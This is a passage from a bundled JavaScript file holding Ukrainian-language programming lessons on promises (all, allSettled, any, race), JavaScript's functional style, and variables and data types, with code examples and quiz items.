3000),\n  create('How are you?', 2000)\n]\n\nPromise.all(promises)\n  .then(responses => responses.forEach(show))\n~~~\n\n![ico-20 warn] Якщо існує ймовірність \"провалу\" хоча б одного з промісів, то весь наш \"пакет\" злетить:\n\n~~~js\nconst executor = (resolve, reject) => Math.random() > 0.5 ? resolve('success') : reject(new Error('ups...'))\n\nconst promises = new Array(10).fill(new Promise(executor))\n\nPromise.all(promises)\n  .then(console.log, console.warn)\n~~~\n\n{{{promise-all-01.js}}}\n\nДавайте повернемося до нашого прикладу 5 і подивимося, наскільки спрощується код при використанні методу **~Promise.all~**:\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\nlet results = null\n\nconst start = Date.now()\n\nconst promises = data\n  .map(value => new Promise(resolve => setTimeout(() => resolve({ time: Date.now() - start, value }), random(5000))))\n\nPromise.all(promises)\n  .then(responses => { results = responses })\n  .then(() => console.log(results))\n~~~\n\n______________________________________________\n\n### ![ico-20 icon] Promise.allSettled\n\nВозвращает промис, который резолвится массивом объектов.\nКожному промісу у вхідному масиві відповідає об'єкт у результуючому масиві.\nОб'єкт має три можливі властивості: **~status~**, **~value~** та **~reason~**.\n\nВластивість **~status~** може набувати одного з двох значень: **~fulfilled~** або **~rejected~**.\nКоли властивість **~status~** має значення **~fulfilled~**, то властивість **~value~** містить результат промісу.\nКоли властивість **~status~** має значення **~rejected~**, то властивість **~reason~** містить повідомлення про причину помилки.\n\n~~~js\nconst promises = ['map', 'google', 'research', 'store'].map(item => Promise.resolve(item))\npromises.push(new Promise((resolve, reject) => setTimeout(reject, 100, 'Access denied.')))\n\nPromise.allSettled(promises)\n  .then(results => results.forEach(console.log))\n~~~\n\n{{{promise-all-settled-01.js}}}\n\n______________________________________________\n\n### ![ico-20 icon] Promise.any\n\nЦей статичний метод конструктора **~Promise~** знаходить перший проміс у \"пакеті\", що благополучно розв'язався, і повертає його.\n\n~~~js\nconst freePort = 4000\n\nconst promises = [3000, 3256, 4000, 3040, 5000]\n  .map(port => new Promise((resolve, reject) => port === freePort ? resolve(port) : reject(port)))\n\nPromise.any(promises).then(console.log)\n~~~\n\nЦей метод хороший тоді, коли ми надсилаємо кілька запитів, але задовольнимось одним із результатів.\nНаприклад, якщо ми хочемо вивести картинку на сторінку, але не пам'ятаємо точно, в якій папці вона знаходиться.\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nconst getURLs = fileName => ['icons', 'images', 'files', 'sounds']\n  .map(folder => `https://garevna.github.io/js-lessons/${folder}/${fileName}`)\n\nfunction testURL (src) {\n  return new Promise ((resolve, reject) => {\n    const img = Object.assign(new Image(48), {\n      onload (event) {\n        resolve(img)\n      },\n      onerror (event) {\n        reject(`Image ${src} does not exist.`)\n      },\n      src\n    })\n  })\n}\n\nconst promises = getURLs('coffee.png').map(url => testURL(url))\n~~~\n\nЯкщо ми скористаємося попереднім методом:\n\n~~~js\nPromise.allSettled(promises).then(console.log)\n~~~\n\nто побачимо в консолі:\n\n~~~console\n▼ (4) [{…}, {…}, {…}, {…}]\n  ► 0: {status: 'fulfilled', value: img}\n  ► 1: {status: 'rejected', reason: 'Image https://garevna.github.io/js-lessons/images/coffee.png does not exist.'}\n  ► 2: {status: 'rejected', reason: 'Image https://garevna.github.io/js-lessons/files/coffee.png does not exist.'}\n  ► 3: {status: 'rejected', reason: 'Image https://garevna.github.io/js-lessons/sounds/coffee.png does not exist.'}\n    length: 4\n  ► [[Prototype]]: Array(0)\n~~~\n\nОднак, якщо ми впевнені, що хоча б один із промісів вирішиться, то можна застосувати метод **~Promise.any~**:\n\n~~~js\nPromise.any(promises)\n  .then(img => document.body.appendChild(img))\n~~~\n\nі тоді ми побачимо на сторінці потрібну картинку.\n______________________________________________\n\n### ![ico-20 icon] Promise.race\n\n\"Скачки\" - який із промісів вирішиться першим.\nНе важливо, яким буде результат.\nГоловне – він прийшов до фінішу першим.\n\n  Тобто якщо першим \"провалиться\" один із промісів, то ми побачимо повідомлення про помилку.\n\nСкористаємося **Github Users API**:\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nconst addElem = tagName => document.body\n  .appendChild(document.createElement(tagName))\n\nconst getURLs = () => ['brynary', 'stocad', 'holin', 'mojombo', 'Bill']\n  .map(id => `https://api.github.com/users/${id}`)\n\nconst show = response => {\n  const text = addElem('h4')\n  if (response.avatar_url) {\n    Object.assign(addElem('img'), {\n      src: response.avatar_url,\n      width: 150\n    })\n    text.innerText = `${response.id}: ${response.login}`\n  } else {\n    text.innerText = response.message.replaceAll('. ', '.\\n')\n    text.style.color = '#a00'\n  }\n}\n\nfunction getPromise (url) {\n  return new Promise ((resolve, reject) => {\n    fetch(url)\n      .then(response => response.json())\n      .then(resolve)\n  })\n}\n\nconst promises = getURLs().map(url => getPromise(url))\n\nPromise.race(promises).then(show)\n~~~\n\n{{{promise-race.js}}}\n__________________________________________________________________________________________\n\n## ![ico-25 icon] Приклади\n\nВикористовуємо **Battery API** для отримання інформації про зарядку акумулятора.\n![ico-25 warn] Цей приклад не працюватиме в консолі сторінки ~about:blank~.\n^^Метод **_getBattery()_** об'єкта **navigator** повертає проміс.^^\n\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\nnavigator.getBattery()\n  .then(result => {\n    for (const prop in result) {\n      console.log(`${prop}: ${result[prop]}`)\n    }\n})\n~~~\n\n__________________________________________________________________________________________\n\n◘◘![ico-25 cap] **11**◘◘\n\n~~~js\nconst boy = [\n  'Hi, what\\'s your name?',\n  'And I\\'m Robert. Where do you live?',\n  'In Lviv. Do you work or study?',\n  'Me too. Okay, see you later, good luck!'\n]\n\nconst girl = [\n  'Hi, I\\'m Helen, and you?',\n  'In Kharkov. And where are you?',\n  'I study and work. And you?',\n  'Thanks, mutually!'\n]\n\nfunction output () {\n  console.log(this.shift())\n  return this[0]\n}\n\nboySpeak = output.bind(boy)\ngirlSpeak = output.bind(girl)\n\nnew Promise(resolve => resolve())\n  .then(boySpeak)\n  .then(boySpeak)\n  .then(boySpeak)\n  .then(boySpeak)\n\nnew Promise(resolve => resolve())\n  .then(girlSpeak)\n  .then(girlSpeak)\n  .then(girlSpeak)\n  .then(girlSpeak)\n~~~\n\n______________________________________________________________\n\nДавайте трохи розширимо прототип конструктора **~Error~**:\n\n~~~~js\nObject.defineProperty(Error.prototype, 'name', {\n  get () { return this.errorNames[this.code] }\n})\n\nObject.defineProperty(Error.prototype, 'message', {\n  get () { return this.messages[this.code] }\n})\n\nObject.assign(Error.prototype, {\n  errorNames: [\n    'CustomError',\n    'RandomError',\n    'FatalError',\n    'GameOver',\n    'Shit',\n    'FuckingError',\n    'StrangeError',\n    'XSS',\n    'DoS',\n    'DDoS'\n  ],\n  messages: [\n    'Not authorized.',\n    'Something happens...',\n    'Access denied.',\n    'Try another way.',\n    'You are the kremlin troll.',\n    'Operation failed.',\n    'Unknown operation.',\n    'Malicious code injection.',\n    'Denial-of-service attack.',\n    'Distributed denial-of-service attack.'\n  ]\n})\n~~~~\n\nКрім того, розширимо функціональність консолі:\n\n~~~~js\nObject.assign(console, {\n  warning (error) {\n    console.warn(`(${error.code}) ${error.name}: ${error.message}`)\n  }\n})\n~~~~\n\nТепер зробимо таке:\n\n◘◘![ico-25 cap] **12**◘◘\n\n~~~js\nconst func = callback => callback(Object.assign(new Error(), { code: Math.round(Math.random() * 9) }))\n\nconst getError = (resolve, reject) => setTimeout(func.bind(null, reject), Math.random() * 10000)\n\nfor (let num = 0; num < 10; num++) {\n  new Promise(getError)\n    .then(null, console.warning)\n}\n~~~\n\n{{{promise-12.js}}}\n\n________________________________\n\n| [![ico-25 plunker] **13**](https://plnkr.co/edit/99ajm1Z3jcpKQQoE ) | [![ico-25 plunker] **14**](https://plnkr.co/edit/DIStxeDAPpXmhSTw ) | [![ico-70 replit] **15**](https://repl.it/@garevna/promise-sample-1 ) |\n\n__________________________________________________________________________________________\n\n[![ico-30 hw] **Quiz**](quiz/promise)\n"},32331:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] JS\n\n### ![ico-20 question] OOP\n\n**JS** не можна строго назвати об'єктно-орієнтованою мовою, оскільки вона порушує деякі принципи об'єктно-орієнтованого програмування. Модель успадкування, заснована на прототипах, по суті, включає делегування, а не успадкування, як це розуміється в мовах з моделлю успадкування на основі класів.\n\n☼☼☼ В JS рулять функції, а не класи ☼☼☼.\n\n### ![ico-20 question] Поліморфізм\n\nЯкщо ви хочете відчути справжній **поліморфізм**, вам потрібен JS.\nТут поліморфізм починається з самого першого кроку.\nУ JavaScript поліморфізм проявляється через різні механізми, такі як перевантаження функцій, успадкування прототипів та динамічна типізація. Ці особливості роблять JS потужним і гнучким інструментом розробки.\n\nЦе приголомшливо!\nНеявне приведення типів спантеличує багатьох, тому що вони не знають, що JS дозволяє контролювати цей процес.\n\nТож прощавай, класова модель успадкування! І хай живе\n☼☼☼ functional freedom of JS! ☼☼☼\n\n### ![ico-20 icon] Func-style\n\n@@@@\nJS включає багато приємних фішок із **функціональних мов програмування**, таких, як _ланцюгові обчислення_, _каррування_ тощо.<br>Функціональщина в JS є прямим наслідком вищесказаного, і, що важливо, вона формує основу асинхронності.\n![](images/funcs-are-our-jam.svg)\n\n@@@@\n\n**Асинхронність** спирається на зворотні виклики, тобто **_функції_**.\nЯкщо коротко, то JS побудований на функціях, і це не просто принцип виконання окремих завдань, а скоріше спосіб існування мови, її основна суть. Основні можливості мови - успадкування на основі прототипів і асинхронність - реалізуються через функції.\n\n### ![ico-20 icon] Jazz\n\n☼☼☼ JS - це джаз, це імпровізація, це фантастична свобода. ☼☼☼\n\nАле свобода приходить з відповідальністю.\n\nВажливо глибоко розуміти, що робитиме движок під час інтерпретації вашого рядка коду.\nДвигун потужний, тому посадити за кермо HMMWV того, хто не вміє їздити, – повне божевілля.\n\n@@@@\n\n![](images/F-35.jpg)\nЩе гірше дозволяти новачкові \"керувати\" F35.<br><br>Занурюйтеся, хлопці! З наполегливістю і терпінням.\n☼☼☼ Гарного польоту з JS! ☼☼☼\n@@@@\n"},90646:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Змінні. Типи даних\n\nТрохи забігаючи наперед, уведемо поняття **глобального об'єкта**.\nГлобальний об'єкт - це те середовище, у якому ми «живемо» (функціонуємо) і за межі якого ми вийти не можемо.\n\n@@@@\n<br>На стороні клієнта JS працює в браузері, у консолі якого, до речі, ми й виконуємо всі наведені нижче операції.<br><br>Це можливо тому, що движок **V8**, вбудований у кожен браузер, інтерпретує наш код і виконує його.\n![](images/v8-logo.svg)\n@@@@\n\nСпрощено кажучи, глобальним об'єктом для нас є браузер (якщо точніше, то його об'єктна модель, але це ми будемо розбирати пізніше).\nСам браузер функціонує в операційній системі і має доступ до її можливостей.\nАле ми не можемо вийти за межі браузера і взаємодіяти з операційною системою безпосередньо.\n\nОтже, операційна система виділяє системні ресурси, зокрема - пам'ять, для роботи додатків, зокрема браузера.\nБраузер розпоряджається виділеним йому ресурсом пам'яті, частину якого він виділяє движку V8.\nДалі ми говоритимемо про змінні, тобто саме про пам'ять, яку використовуватиме наш додаток.\n\nДля нашого коду доступ до глобального об'єкта забезпечується за допомогою змінної **~window~**.\n\n## ![ico-30 icon] Пам'ять і дані\n\nПам'ять являє собою величезну кількість комірок, кожна з яких може містити 0 або 1.\n\n@@@@\nТака комірка - це **біт** пам'яті.<br>Тому двійкова система числення стала базою для появи перших комп'ютерів.<br>Із **8 бітів** виходить **1 байт** пам'яті.\n![](illustrations/vars-bit-and-byte.png)\n@@@@\n\nВ **1 байт** пам'яті можна помістити максимум 8 одиниць, тобто двійкове число ~11111111~.\n\nУ десятковій системі числення це буде число ~255~ без знака.\nЯкщо **байт** (8 біт) інтерпретувати як знакове число, то один біт міститиме знак числа (**+ **або** -**), тому максимальне число зі знаком, яке може «поміститися» в один байт, буде 127 (сім одиниць).\n\n••-1111111↓↓2 ↓↓ → -127↓↓10↓↓••\n\n^^Будь-яке число може бути представлене в двійковій системі числення набором нулів і одиниць:^^\n\n{{{vars-01.js}}}\n\n^^Будь-яке число можна розкласти за ступенями двійки + залишок (0 або 1).^^\n^^Оскільки в двійковій системі двійка - це десятка, замінюємо ступені двійки на ступені десятки, складаємо і додаємо залишок.^^\n^^Усе досить просто.^^\n\n{{{vars-binary.js}}}\n\nЯк ви вже здогадалися, комп'ютер може працювати тільки з двійковими числами, тобто з наборами нулів і одиниць.\nЛогічне запитання: як же в комп'ютері зберігається текст, картинки і відео тощо.\n\nБудь-який відтінок представляється у вигляді кількох чисел:\n\n{{{vars-color.js}}}\n\nБудь-який символ представляється його кодом (числом):\n\n{{{vars-char.js}}}\n\nТаким чином, будь-яка інформація представлена в пам'яті комп'ютера наборами нулів і одиниць, і управління розподілом пам'яті - дуже складний процес.\nАбсолютно неймовірно оперувати фізичними адресами пам'яті для доступу до даних.\nЦе робить операційна система.\nВам не потрібно знати фізичні адреси, за якими зберігатимуться ваші дані.\nДля кожного елемента даних вам потрібно придумати ім'я і повідомити движку, який елемент даних ви зберігатимете під цим ім'ям.\nТаким чином і створюється **змінна**.\nОтже, **змінні** полегшують вам маніпуляції з даними і забезпечують безпеку операційної системи та додатків, що працюють.\n_________________________________________________________________\n\n## ![ico-30 icon] var\n\nВаші дані (числа, рядки тощо) зберігатимуться в пам'яті комп'ютера, поки працює ваш застосунок, але вам не потрібно знати точно, де саме движок зберігає їх.\nІмена змінних - це зручна форма адресації, коли вам не потрібно маніпулювати фізичними адресами пам'яті.\nВам достатньо вказати движку ім'я змінної, і надалі ви зможете використовувати це ім'я для отримання доступу до даних.\n\nДля оголошення змінної використовується ключове слово **~var~**, за яким (через пробіл) слідує ім'я змінної.\n\nЗустрівши таке оголошення, движок резервує певну ділянку пам'яті комп'ютера і «прив'язує» до вказаного вами імені змінної адресу пам'яті, виділеної для її зберігання.\n\n^^Зверніть увагу, що в разі потреби движок може перемістити збережене значення в іншу ділянку пам'яті, водночас він автоматично змінить значення адреси, до якої прив'язане ім'я змінної, ви навіть не дізнаєтесь про це.^^\n\n![ico-25 warn] Оголошення змінної за допомогою ключового слова **~var~** поміщає нашу змінну в глобальний об'єкт **~window~**.\n\n~~~js\nvar number\n~~~\n\nЩо це означає для нас?\nЩо ми можемо звернутися до значення цієї змінної як безпосередньо за її ім'ям, так і опосередковано, через глобальний об'єкт:\n\n^^ у точковій нотації:^^\n••window.number••\n\n^^або так:^^\n\n••window['number']••\n\nПід час оголошення змінної їй можна відразу присвоїти початкове значення.\n\nДля цього використовується найпоширеніший **оператор мови** - оператор присвоювання **~ =~**.\n\n§§§§ Demo | var_01_template §§§§\n\nУ лівій частині оператора присвоювання має бути ім'я змінної, у правій - якийсь **вираз**.\nДвижок обчислить значення виразу в правій частині оператора присвоювання і помістить обчислене значення в змінну, ім'я якої вказано в лівій частині оператора.\n\n~~~js\nvar number = 5 + 8 - 4\n~~~\n\nПісля виконання цього коду у змінній **~number~** буде число 9.\n\nЯкщо в лівій частині оператора присвоювання міститься вираз, значення якого не є іменем змінної:\n\n~~~js\n'user' + 'Name' = 9 + 8\n~~~\n\nто движок згенерує виняток:\n\n~~~error\n    Uncaught SyntaxError: Invalid left-hand side in assignment\n~~~\n\nОднак це не означає, що в лівій частині оператора присвоювання не може бути виразу.\n\nРозглянемо приклад.\n\n^^^[![ico-25 coffee] 1]\n\nОголосимо змінну **~userName~** і присвоїмо їй значення 'Piter':\n\n~~~js\nvar userName = 'Piter'\n~~~\n\nНаша змінна потрапила в глобальний об'єкт **~window~**.\nТому ми маємо доступ до неї як до змінної **~window.userName~**.\nАбо як **~window['userName']~**.\n\nТому ми можемо використовувати в лівій частині оператора присвоювання вираз, після обчислення якого движок отримає посилання на змінну:\n\n~~~js\nwindow['user' + 'Name'] = 'Helen'\n~~~\n\nМожете перевірити самостійно, що значення змінної **~userName~** змінилося.\n\n^^^\n\n^^Коли ми дійдемо до деструктуризації, ви побачите, які ще вирази можуть бути в лівій частині оператора присвоєння.^^\n\n\n\n![ico-25 warn] Якщо ми оголосимо змінні, але не присвоїмо їм початкові значення:\n\n~~~js\nvar x, y, z\n~~~\n\nто їхнім значенням буде **~undefined~** (не визначено).\n\n![ico-25 warn] Якщо ми не оголосимо змінну, але спробуємо звернутися до неї:\n\n~~~js\nconsole.log(sigma)\n~~~\n\n![ico-20 err] то в консолі з'явиться повідомлення про помилку:\n\n~~~error\n    Uncaught ReferenceError: sigma is not defined\n~~~\n\nМожна оголосити відразу кілька змінних в одному рядку, розділяючи їх комою:\n\n~~~js\nvar person = 'Piter',  hobby = 'football',  age = 30\n~~~\n\n______________________________________________________________\n\n## ![ico-30 icon] Імена змінних\n\n![ico-25 warn] Імена змінних можуть містити букви, цифри, символи підкреслення і знаки долара.\n\n![ico-25 warn] Імена змінних можуть починатися з літери, символів ~ $~ і ~ _~.\n\n§§§§ Demo | var_02_template §§§§\n\nРекомендується давати довгі та зрозумілі імена змінних і функцій, складені з декількох слів.\nЦе покращує читабельність коду:\n\n~~~js\nvar lastUserVisit = '2019-02-05'\n~~~\n\n![ico-25 warn] Імена змінних чутливі до регістру (~name~ і ~Name~ - різні змінні).\n\n§§§§ Demo | var_03_template §§§§\n\n@@@@\n![](illustrations/camel-case.png)\n\n**Camel Case** - стиль написання імен змінних, що складаються з декількох слів, коли кожне наступне слово починається з літери у верхньому регістрі.<br><br>Перша літера, з якої починається ім'я змінної, має бути в нижньому регістрі.\n@@@@\n\n^^З літери у верхньому регістрі заведено починати тільки імена конструкторів і класів, з якими ми познайомимося пізніше.^^\n\n^^На майбутнє: імена **функцій** рекомендується починати з **дієслова**, щоб відрізняти їх від імен змінних, у яких зберігаються дані.^^\n\n[![ico-25 warn] **_Зарезервовані слова_**](https://www.w3schools.com/js/js_reserved.asp ) не можуть використовуватися як імена змінних.\n\n![ico-25 warn] Імена змінних не можуть починатися з цифри.\n\n~~~js\nvar 14br = 10\n~~~\n\n~~~error\n    Uncaught SyntaxError: Invalid or unexpected token\n~~~\n\n______________________________________________________________\n\n## ![ico-30 icon] Типи даних\n\nЯк ви вже зрозуміли, будь-які дані зберігаються в пам'яті комп'ютера як набір нулів і одиниць.\nДля того, щоб движок міг коректно інтерпретувати цей набір нулів і одиниць, він повинен знати, що було збережено за цією адресою: число, рядок або щось інше.\n\nПрипустимо, за вказаною адресою в пам'яті міститься двійкове число:\n\n••0100011001000111010010000100100101001011010011000100110101001110••\n\nЙого можна інтерпретувати як десяткове ціле число:\n\n••5064095785634516000••\n\nабо як рядок, кожен символ якого займає 1 байт:\n\n••FGHIKLMN••\n\nІснує також маса інших варіантів інтерпретації.\n\n^^У змінних можуть зберігатися числа, рядки, логічні значення, специфічні значення **~null~** і **~undefined~**, а також дані **посилального типу**, з якими ми познайомимося пізніше.^^\n\nОтже, важливо, щоб движок знав тип даних, які зберігаються у змінній.\n\nНа відміну від мов із суворою типізацією, нам не потрібно під час оголошення змінної вказувати тип даних, які ми передбачаємо зберігати в цій змінній.\n\n**Тип даних визначається в процесі присвоювання значення.**\nЦе називається **динамічною типізацією**.\n\n______________________________________________________________\n\n### ![ico-25 icon] String\n\nРядок - це впорядкований набір символів, які укладаються в подвійні (_\"My name is Piter\"_) або одинарні (_'My name is Piter'_) лапки.\n\n| ^^ 0^^ | ^^ 1^^ | ^^ 2^^ | ^^ 3^^ | ^^ 4^^ | ^^ 5^^ | ^^ 6^^ | ^^ 7^^ | ^^ 8^^ | ^^ 9^^ | ^^10^^ | ^^11^^ | ^^12^^ | ^^13^^ | ^^14^^ | ^^15^^ |\n| ** M** | ** y** |        | ** n** | ** a** | ** m** | ** e** |        | ** i** | ** s** |        | ** P** | ** i** | ** t** | ** e** | ** r** |\n\nМожна загорнути рядок і в зворотні лапки **~ `~**, але зворотні лапки заведено використовувати для [**►►►темплейтних літералів**►►►](page/literals).\n\nЯкщо всередині рядка зустрічаються подвійні лапки, то сам рядок має бути загорнутий в одинарні, і навпаки.\n\n◘◘![ico-25 cap]◘◘\n\n~~~js\nvar str = '\"es2023\" is a shorthand for \"ECMAScript 2023 Language Specification\".'\n~~~\n~~~js\nvar str = \"'es2023, x' is a shorthand for 'ECMAScript 2023 Language Specification'.\"\n~~~\n\nОднак можна використовувати екрануючий слеш **~&bsol;~**, щоб дати зрозуміти движку, що це не закривна лапка, а просто символ рядка:\n\n~~~js\nstr = '\\'es2023, x\\' is a shorthand for \\'ECMAScript 2023 Language Specification\\'.'\n~~~\n\nКожен символ має свій числовий код.\n\nВідповідність між символом і його кодом встановлюється в кодувальній таблиці.\n\nНайширше охоплення символів різних алфавітів представлено в кодуванні **UTF-8** (Unicode Transformation Format, 8-bit).\n\nКодування [%%% **UTF-8**%%%](https://blog.hubspot.com/website/what-is-utf-8 ) зараз є домінуючим у веб.\n\n_____________________________________\n\nОскільки рядки - це впорядкований набір символів, то кількість символів у рядку визначає його довжину, логічно?\nТож у рядків є властивість **~length~**, яка доступна нам у такий спосіб:\n\n§§§§ Demo | var_string_length_template §§§§\n\nДо речі, зверніть увагу на такий вираз:\n\n~~~console\nmessage + string\n~~~\n\nТут оператор **~ + ~** виступає в ролі оператора **конкатенації рядків**.\nЦе створює певні незручності, оскільки нам звичніше розглядати його як **арифметичний оператор** додавання.\n^^З огляду на **динамічну типізацію**, така двоїстість оператора **~ + ~** може призвести до неприємних побічних ефектів, які ми розглянемо в розділі «Приведення типів».^^\n^^Пізніше ми познайомимося з **темплейтними літералами**, які дозволять нам уникати конкатенації рядків.^^\n\n______________________________________________________________\n\n### ![ico-25 icon] Number\n\n**тип даних: \"number\"**.\n\n![ico-20 warn] Записується без лапок.\n\n![ico-20 warn] Для відокремлення десяткових розрядів використовується крапка:\n\n~~~js\nvar x = 53.25\n~~~\n\nЦе найпроблемніший тип даних у **JavaScript**.\n\nРозберемося, у чому тут проблема.\n\nДо одного й того самого типу ~number~ належать цілі числа, десяткові числа (числа з плаваючою крапкою), числа в експоненціальній формі (~5e+37~), а також такі значення, як **~Infinity~** (нескінченність) і **~NaN~** (**Not a Number** - не число).\n\n| ціле число                      | ~15~                        |\n| число з плаваючою крапкою       | ~5.80~                      |\n| число в експоненціальній формі  | ~5e+37~                     |\n| **~Infinity~**                  | нескінченність              |\n| **~NaN~**                       | **Not a Number** - не число |\n\nІснує обмеження на величину числа, що пов'язано з виділенням пам'яті на зберігання даних типу **~number~**.\n\n#### ![ico-20 icon] Цілі числа\n\n**Безпечне** ціле число може містити максимум 15 цифр:\n\n{{{vars-number-1.js}}}\n\nЗверніть увагу, що після 20 цифр число автоматично подається в експоненціальній формі.\n\n#### ![ico-20 icon] Експоненціальна форма\n\nЦілі числа з великою кількістю нулів (500000000000000) або дуже маленькі числа з плаваючою крапкою (0.000000001) набагато зручніше записувати в експоненціальній формі.\n\nЕкспоненціальна форма запису числа має вигляд: **~1.8e+5~**, де символ **~e ~** розділяє мантису і порядок числа. У цьому прикладі мантиса (змістовна частина числа) дорівнює **~1.8~**, а **~5 ~**- це ступінь, до якого потрібно піднести число **~10~**. Щоб отримати число у звичному для нас вигляді, потрібно помножити мантису на число, що вийшло в результаті піднесення до степеня числа **~10~**:\n\n••1.8 ✖ 10↑↑5 ↑↑••\n\nУ результаті ми отримаємо число **180000**.\n\n••500 → 5e+2 (5 * 10↑↑2 ↑↑)••\n••5000 → 5e+3 (5 * 10↑↑3 ↑↑)••\n••50000 → 5e+4 (5 * 10↑↑4 ↑↑)••\n\n••0.05 → 5e-2 (5 / 10↑↑2 ↑↑)••\n••0.005 → 5e-3 (5 / 10↑↑3 ↑↑)••\n••0.0005 → 5e-4 (5 / 10↑↑4 ↑↑)••\n\n{{{vars-number-exponential-1.js}}}\n\nОднак «під капотом» движок сам перетворює число до експоненціальної форми для економії пам'яті.\n\n{{{vars-number-exponential-2.js}}}\n\n_____________________________________\n\n#### ![ico-20 icon] Infinity\n\n![ico-20 warn] Значення **~Infinity~** може вийти під час ділення на нуль:\n\n~~~js\nvar x = 1, y = 0\nvar z = x / y\n~~~\n\n^^Значенням змінної **~z ~** буде **~Infinity~**.^^\n\nВзагалі кажучи, **~Infinity~** - це константа, яка має певне значення, що пов'язано з обмеженням обсягу пам'яті для зберігання чисел.\n\n{{{vars-number-infinity.js}}}\n\n_____________________________________\n\n#### ![ico-20 icon] NaN\n\n![ico-20 warn] Значення **~NaN~** може вийти під час спроби виконання арифметичних операцій з операндами, що не є числами і не приводяться до числа, наприклад: ~5 * 'total'~, а також під час спроби розділити нуль на нуль: ~0 / 0~.\n\n\n![ico-20 warn] Значення **~NaN~** не дорівнює жодному іншому значенню, включаючи саме значення **~NaN~**.\n\n![ico-20 warn] Жодні арифметичні операції в JS ніколи не будуть завершені з помилкою, оскільки в разі помилки операція поверне **~NaN~**.\n\n__________________________________________________\n\n#### ![ico-20 icon] Похибка обчислень\n\nА тепер поговоримо про точність обчислень і округлення чисел.\n\n{{{vars-number-4.js}}}\n\nОтже, робота з числами у нас явно не в пріоритеті, і якщо ви раптом вирішите використовувати **JS** як **Fortran**, то вам доведеться попаритися з похибками обчислень.\n\n_____________________________________\n\n#### ![ico-20 icon] Тести number\n\n◘◘** 1**◘◘\n\n→→→ 8e-2 | 800, 0.8, 0.08, 8 | 0.08 →→→\n\n◘◘** 2**◘◘\n\n→→→ 1.7e+2 | 170, 1.7, 0.17, 17 | 170 →→→\n\n◘◘** 3**◘◘\n\n→→→ 0.3e+310 | 3e+309, Infinity | Infinity →→→\n\n◘◘** 4**◘◘\n\n→→→ 3e-300 ✖ 1e+30 | 3e-900, Infinity, 0, 3e-270 | 3e-270 →→→\n\n◘◘** 5**◘◘\n\n→→→ 1e-5 + 2e-5 | 3e-5, 0.00003, 0.000030000000000000004, NaN | 0.000030000000000000004 →→→\n\n◘◘** 6**◘◘\n\n→→→ 0.003 + 0.0015 | 0.0045000000000000005, 0.0045, 45e-4, NaN | 0.0045000000000000005 →→→\n\n◘◘** 7**◘◘\n\n→→→ 5e+310 - Infinity | 0, Infinity, NaN | NaN →→→\n\n◘◘** 8**◘◘\n\n→→→ 0.005 + Infinity + NaN | 0.005, 0, Infinity, NaN | NaN →→→\n\n◘◘** 9**◘◘\n\n→→→ 5e+300 - Infinity | 5e+300, 0, -Infinity, NaN | -Infinity →→→\n\n______________________________________________________________\n\n### ![ico-20 icon] Boolean\n\nЛогічний тип даних.\n\nПриймає тільки два можливих значення:  **~true~** або **~false~**.\n\n^^(без лапок, '_true_' - це вже рядок).^^\n\nДані цього типу автоматично отримуються в результаті порівнянь:\n\n~~~js\n5 > 8\n~~~\n~~~console\nfalse\n~~~\n\n~~~js\n'a' < 'b'\n~~~\n~~~console\ntrue\n~~~\n\nЗаодно, до речі, ми познайомилися з бінарними операторами порівняння **~ >~** і **~ <~**.\nЗа допомогою операторів порівняння створюються [►►►**логічні вирази**►►►](page/Boolean).\nРезультатом обчислення значення **логічного виразу** завжди буде **логічне значення** (**~true~** або **~false~**).\n\nТобто якщо ми оголосимо змінну **~bool~**:\n\n~~~js\nvar bool = 5 > 8\n~~~\n\nто це буде змінна **логічного типу** (**~boolean~**).\n\nДалі ми будемо часто стикатися з даними типу **~boolean~**.\n\n______________________________________________________________\n\n### ![ico-20 icon] undefined\n\n**тип даних: \"undefined\"**.\n\nЗмінні іноді оголошуються без присвоювання їм початкового значення.\n\nЯкщо змінна оголошена без значення, її значення буде **~undefined~**.\n\n^^(без лапок, _'undefined'_ - це вже рядок).^^\n\n______________________________________________________________\n\n## ![ico-25 icon] Оператор typeof\n\n^^Ще один оператор мови, з яким ви знайомитеся сьогодні.^^\n^^Перший, як ви пам'ятаєте, це **оператор присвоювання**.^^\n^^Далі ми познайомилися з двома **операторами порівняння**.^^\n\nОператори мови завжди мають **операнди**.\nНаприклад, оператор присвоювання має два операнди: один - ліворуч, другий - праворуч.\n\n![ico-20 warn] Операнди завжди відокремлюються від оператора пропуском.\n\nЗалежно від числа операндів оператор може бути:\n\n| оператор  | число операндів | приклад                                  |\n| унарний   | 1               | **~typeof~**                             |\n| бінарний  | 2               | **~ =~**, **~ >~**, **~ <~**             |\n| тернарний | 3               | цей оператор ми розглянемо трохи пізніше |\n\nОголосимо змінну **~num~** і присвоїмо їй значення 10:\n\n~~~js\nvar num = 10\n~~~\n\nА тепер скористаємося оператором **~typeof~**, щоб дізнатися тип даних змінної **~num~**:\n\n~~~js\ntypeof num\n~~~\n\nВ консолі ми побачимо:\n\n~~~console\n'number'\n~~~\n\nДавайте розберемося, що робить движок, коли зустрічає вираз ~**typeof** num~.\nДвижок обчислює значення цього виразу і замінює вираз ~**typeof** num~ на обчислене значення.\n\nПодивимося ще один приклад:\n\n~~~js\nvar companyName = 'Google'\n\ntypeof companyName\n~~~\n\n~~~console\n'string'\n~~~\n\n![ico-25 warn] Оператор **~typeof~** повертає **рядок**.\n\nЩо це означає?\n\n~~~js\nvar boolean = false\n\ntypeof boolean\n~~~\n\n~~~console\n'boolean'\n~~~\n\nЦе означає, що якщо движок зіткнеться з таким виразом (позбавленим усякого сенсу, крім пізнавального - для вас):\n\n~~~js\ntypeof typeof boolean\n~~~\n\nто ми завжди отримаємо одну й ту саму відповідь:\n\n~~~console\n'string'\n~~~\n\nМожливі значення (рядки), що повертаються оператором **~typeof~**:\n\n• ~string~\n• ~number~\n• ~bigint~\n• ~boolean~\n• ~object~\n• ~undefined~\n• ~function~\n• ~symbol~\n\nЯк бачите, у цьому списку є типи даних, які ми поки що не розглядали і які нам ще належить вивчити.\n\n__________________________________________________\n\n### ![ico-20 icon] Тести typeof\n\n◘◘** 